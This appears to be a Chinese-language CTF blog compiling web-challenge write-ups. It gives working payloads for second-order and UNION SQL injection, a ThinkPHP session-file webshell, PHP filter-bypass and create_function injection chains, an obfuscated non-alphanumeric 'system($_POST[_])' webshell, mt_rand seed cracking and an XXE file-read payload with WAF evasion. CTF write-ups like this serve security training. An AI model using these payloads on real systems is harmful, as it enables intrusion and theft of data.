@[TOC]


# October 2019 Twice SQL Injection

二次注入，可以github查看源码，当然不看也可以
注册账户`admin' union select database() #`
![在这里插入图片描述](https://img-blog.csdnimg.cn/96cd28591c88433f98204361ba7af20b.png)
查表名字段
![在这里插入图片描述](https://img-blog.csdnimg.cn/47bf036630304ce0ac8224cf4d684f94.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/0daf1ced7ba6482fac0764fd6500d511.png)
`admin' union select group_concat(column_name) from information_schema.columns where table_name=0x666c6167#`

`admin' unoin select flag from flag#`
![在这里插入图片描述](https://img-blog.csdnimg.cn/492b49aa6ec64db29b7527b89416b51e.png)

# [GYCTF2020]EasyThinking
>[学习文章](https://blog.csdn.net/qq_43801002/article/details/105930835)

输入一个不存在的路由
![在这里插入图片描述](https://img-blog.csdnimg.cn/78a960e4f16f47f492800e24c50db0ef.png)
用thinkphp 6.0
>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）
然后再search搜索的内容会直接保存在/runtime/session/目录下，getshell

注册的时候抓包更改session
![在这里插入图片描述](https://img-blog.csdnimg.cn/838c62a0bf2e4efaae06fe945a796044.png)


搜索的时候直接输入一句话，访问指定该session文件位置访问到一句话马文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/1700bfe3167943d0a4f394e59e7b59f9.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/a33d186283844387849d9d90a3e69a44.png)
蚁剑连接无法查看flag，发现是有disable_functions限制，使用蚁剑绕过disable_functions插件
![在这里插入图片描述](https://img-blog.csdnimg.cn/823b293c43bf43fea559e42e5668d070.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9b8cf9fb91c34c7a92339f2f034607f2.png)

# [BJDCTF2020]EzPHP
>[参考文章](https://blog.csdn.net/weixin_51804748/article/details/121330064)

ctrl+u源码
![在这里插入图片描述](https://img-blog.csdnimg.cn/89b29a2d4ddd48beb6a9014765d4c0df.png)
base32解码
![在这里插入图片描述](https://img-blog.csdnimg.cn/1181bf2f4a284ffe942c81e89e3f2fe6.png)
1nD3x.php

```php
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];//两个参数，shana，passwd
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { //使用url传参进行检测，`$_SERVER[‘QUERY_STRING’]`解析字符串时不会进行url解码，所以可以用url编码绕过
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {//file参数
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { //看起来有preg_match换行绕过
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))//有POST变量时不检测GET变量，POST同时传一个值即可  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')//传参php://input或者data://
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){//绕过sha1
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
Aqua is the cutest five-year-old child in the world! Isn't it ?

```

第一个，`$_SERVER[‘QUERY_STRING’]`解析字符串时不会进行url解码，所以可以用url编码绕过，而`$_GET['x']`是会进行url解码的，所以我们要把可能出现在黑名单的字符串进行url编码后再传入

第二个，`preg_match`没开m多行匹配，所以可以用多行绕过，需要注意相关关键词需要url编码绕过第一层
![在这里插入图片描述](https://img-blog.csdnimg.cn/4e5dfe46ca634c3aa5eb0d86925b6be1.png)
第三个，`$_REQUEST`同时接收`$_POST`和`$_GET`变量，POST优先级高于$_GET，所以这里POST传GET相应变量没字母的`值`即可
![在这里插入图片描述](https://img-blog.csdnimg.cn/34f631bd7e9f46d3990060840e064198.png)
第四个，`file_get_contents()`需要传入字符串，data://伪协议
![在这里插入图片描述](https://img-blog.csdnimg.cn/642587273ca54eb7999f4f763d62f08b.png)
第五个,sha1传数组或者两个加密内容为0e开头的都行
`sh%61%6ea[]=1&pa%73%73%77d[]=2`
![在这里插入图片描述](https://img-blog.csdnimg.cn/ac352bfaaff445afa10be0be13cc5104.png)
第六个，extract变量覆盖
传一个flag覆盖一下code变量值和arg变量值
![在这里插入图片描述](https://img-blog.csdnimg.cn/b7e3e002a9da4f4794bfb48dfff7f44a.png)
`fl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//`

完整payload:
`file=data://te%78%74/pl%61%69%6e,de%62%75_de%62%75_aq%75%61
&de%62%75=aq%75%61_is_cu%74%65%0a
&sh%61%6ea[]=1
&pa%73%73%77d[]=2
&fl%61g[c%6fde]=create_function
&fl%61g[%61rg]=}var_dump(get_defined_vars());//`
![在这里插入图片描述](https://img-blog.csdnimg.cn/cdfbc40b37d847a683b7c4b6ca5cfb70.png)

发现flag好像在`rea1fl4g.php`
![在这里插入图片描述](https://img-blog.csdnimg.cn/68943f7ff94c4c3ebea864459f458bfb.png)
没东西，可以通过之前尝试包含该文件，然后dump所有变量`get_defined_vars()`
直接拉过来大佬的payload吧
`fl%61g[c%6fde]=create_function
&fl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//
//%6c为url编码的o，为了绕过黑名单
`
文件名base64编码绕过滤
![在这里插入图片描述](https://img-blog.csdnimg.cn/a9ca4317b3ec4cf49d22bdee8215f5b3.png)
假flag....直接抄作业了

```php
<?php
$a="php://filter/read=convert.base64-encode/resource=rea1fl4g.php";

echo urlencode(~$a);
?>
//%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F


```

`fl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
`![在这里插入图片描述](https://img-blog.csdnimg.cn/2a7e6afdf471441f95ea745b4d4c9961.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/149b042920c5466db7be78966a22347a.png)

# [HFCTF2020]JustEscape(vm2沙箱逃逸)
待补待补待补nodejs

# [GXYCTF2019]StrongestMind

编写脚本

通过正则匹配获取页面上表达式，计算后post传参
>[学习文章](https://blog.csdn.net/shinygod/article/details/124141957)

官方exp：

```python
from requests import *
import re


s = session()
a = s.get("http://172.21.4.12:10044/index.php")
pattern = re.findall(r'\d+.[+-].\d+', a.text) 
c = eval(pattern[0])
a = s.post("http://172.21.4.12:10044/index.php", data = {"answer" : c})
for i in range(1000):
	pattern = re.findall(r'\d+.[+-].\d+', a.text) 
	c = eval(pattern[0])
	print(c)
	a = s.post("http://172.21.4.12:10044/index.php", data = {"answer" : c})
print(a.text)

```

```python
import requests
import re
import time

url = 'http://288076b5-3a7f-4530-8794-20da1e87d0bc.node4.buuoj.cn:81/'
session = requests.session()
req = session.get(url).text
flag = ""

for i in range(1010):
    try:
        result = re.findall("\<br\>\<br\>(\d.*?)\<br\>\<br\>",req)#获取[数字]
        result = "".join(result)#提取字符串
        result = eval(result)#运算
        print("time: "+ str(i) +"   "+"result: "+ str(result))

        data = {"answer":result}
        req = session.post(url,data=data).text
        if "flag{" in req:
            print(re.search("flag{.*}", req).group(0)[:50])
            break
        time.sleep(0.2)#防止访问太快断开连接
    except:
        print("[-]")


```

# [GKCTF 2021]easycms

后台admin.php

这个可以开burp扫一下，或者用dirsearch扫一下，一些url会自动跳转index.php

后台密码12345

一般后台会考虑写马连接，这里不是直接编辑网页源代码，点设计->主题->导出
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c4f1c4c020749ae8ff40cc277eeb25f.png)
抓包会发现下载文件传的参数
![在这里插入图片描述](https://img-blog.csdnimg.cn/abc34886f7ab41e3b6aea02a167de8b0.png)
改为`/flag`的base64编码即可下载flag


# [SUCTF 2018]GetShell

>[向大佬学习](https://blog.csdn.net/qq_43431158/article/details/108089364)

```php

if($contents=file_get_contents($_FILES["file"]["tmp_name"])){
    $data=substr($contents,5);
    foreach ($black_char as $b) {
        if (stripos($data, $b) !== false){
            die("illegal char");
        }
    }     
} 

```
1. 首先进行模糊测试，测黑名单过滤了哪些字符，代码段检测文件第五位之后的内容
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/4535997c48554d518ba7d72a85fc9ec5.png)
burp   fuzz
能用的字符如下
![在这里插入图片描述](https://img-blog.csdnimg.cn/bef835c0737f42848147432ee16da6ab.png)
使用取反RCE，本题不能用双引号，看大佬博客拉来的payload

```php
$_=[]; //array
$__=$_.$_; /arrayarray
$_=($_==$__);//$_=(array==arrayarray) false 0
$__=($_==$_);//$__=(array==array) true 1

$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];//system
$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];//_POST

$___($$____[_]);//system($_POST[_]);


```

内容要先写到文件里再上传，不然编码有问题

![在这里插入图片描述](https://img-blog.csdnimg.cn/84835e84e51f4effae2934aa5e8e2a5c.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/6557996b18f64eb5a0996ef738c8e422.png)
>这题的flag在环境变量中，可能是配置问题，使用下env命令即可得出flag。

![在这里插入图片描述](https://img-blog.csdnimg.cn/7bc04eec274742dc8faa2c0c97637e84.png)

# [b01lers2020]Life on Mars
>[博客来源](https://blog.csdn.net/qq_24033605/article/details/121140847)

抓包发现有关键词，SQL注入

`'or 1=1`这个测试我没做成功，看到佬直接用`union`


`chryse_planitia/**/union/**/select/**/1,2`

![在这里插入图片描述](https://img-blog.csdnimg.cn/ac01c3bceeee41a2a3b7361ea9077e1f.png)
数据库`chryse_planitia/**/union/**/select/**/database(),2`
![在这里插入图片描述](https://img-blog.csdnimg.cn/657e282a465e4cd4937736becb26f4d3.png)
表名`chryse_planitia/**/union/**/select/**/group_concat(schema_name),2/**/from/**/information_schema.schemata`

![在这里插入图片描述](https://img-blog.csdnimg.cn/3a71f8e865c34bfc89c14063801b8acd.png)
表名`chryse_planitia/**/union/**/select/**/group_concat(table_name),2/**/from/**/information_schema.tables/**/where/**/table_schema='alien_code'`
![在这里插入图片描述](https://img-blog.csdnimg.cn/fb6234085c3d44008c39e5fab603c178.png)
列名`chryse_planitia/**/union/**/select/**/group_concat(table_name),2/**/from/**/information_schema.columns/**/where/**/table_name='code'`

![在这里插入图片描述](https://img-blog.csdnimg.cn/02871ddc30e3448090e30de7431d6c2a.png)
flag
`chryse_planitia/**/union/**/select/**/group_concat(code),2/**/from/**/alien_code.code`
![在这里插入图片描述](https://img-blog.csdnimg.cn/99ddfa3a7a1c445ba7252a7b37420563.png)

# [WMCTF2020]Make PHP Great Again

>[参考博客](https://blog.csdn.net/rfrder/article/details/120975636)
>[漏洞介绍、复现、必读](https://www.anquanke.com/post/id/213235)

payload:`http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
`
![在这里插入图片描述](https://img-blog.csdnimg.cn/4cb84ae4577f4df8aa4c192a55e41e09.png)
# [MRCTF2020]Ezaudit

页面点了点没什么信息，试了试www.zip有源码

```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???


```
访问login.html，post设置login
![在这里插入图片描述](https://img-blog.csdnimg.cn/b68f5ae618474ae2be04110d6da70349.png)
已知公钥为`KVQP0LdJKRaV3n9D`
将其转换为能被php_mt_seed识别的序列，字典字符串要和题目里一样

```php

    <?php
    $allowable_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';//这里要和题目一样
    $len = strlen($allowable_characters) - 1;
    $pass = "KVQP0LdJKRaV3n9D";
    for ($i = 0; $i < strlen($pass); $i++) {
      $number = strpos($allowable_characters, $pass[$i]);
      echo "$number $number 0 $len  ";
    }
    echo "\n";
    ?>

# 36 36 0 61  47 47 0 61  42 42 0 61  41 41 0 61  52 52 0 61  37 37 0 61  3 3 0 61  35 35 0 61  36 36 0 61  43 43 0 61  0 0 0 61  47 47 0 61  55 55 0 61  13 13 0 61  61 61 0 61  29 29 0 61

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/62183d66685b4a4180a29936a6b792ab.png)
`1775196155`

然后使用该种子生成私钥


```php

mt_srand(1775196155);
$length=12;
$strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$private_key = '';
for ( $i = 0; $i < $length; $i++ )
$private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
echo $private_key;
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/51257b7d18ae4b8a8a4aec328d89a095.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f100d74732f47839c1a3e26932b14c4.png)
KVQP0LdJKRaV3n9D
XuNhoueCDCGc

密码用万能密码绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/39c5fb6606f1416980947c833e99ada6.png)
# [CSAWQual 2019]Web_Unagi

flag在/flag

上传xml文档会被解析，但是有waf保护

编码绕过`iconv -f utf8 -t utf-16 1.xml>2.xml`

>[绕过WAF保护的XXE](https://xz.aliyun.com/t/4059)

```xml
<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<users>
    <user>
        <username>gg</username>
        <password>passwd1</password>
        <name>ggg</name>
        <email>alice@fakesite.com</email>  
        <group>CSAW2019</group>
        <intro>&xxe;</intro>
    </user>
    <user>
        <username>bob</username>
        <password>passwd2</password>
        <name> Bob</name>
        <email>bob@fakesite.com</email>  
        <group>CSAW2019</group>
        <intro>&xxe;</intro>
    </user>
</users>

```

